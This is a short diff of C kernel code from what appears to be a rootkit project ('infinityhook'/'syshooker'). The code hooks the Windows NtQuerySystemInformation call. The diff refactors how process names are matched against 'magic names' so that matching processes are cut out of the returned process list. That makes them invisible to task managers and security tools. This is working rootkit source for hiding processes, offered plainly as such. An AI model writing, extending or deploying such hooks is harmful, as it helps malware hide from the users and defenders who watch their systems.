@@ -62,12 +62,14 @@ NTSTATUS DetourNtQuerySystemInformation(
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
                 //kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws\n", ProcessNameBuffer);
 
-				if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
+				//if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
+					//kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
+				//}
+
+				// original check - uncomment to go back
+				// if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
+				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
 					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
-				}
-
-				if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
-
 					// Not the last one
 					if (ProcessInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
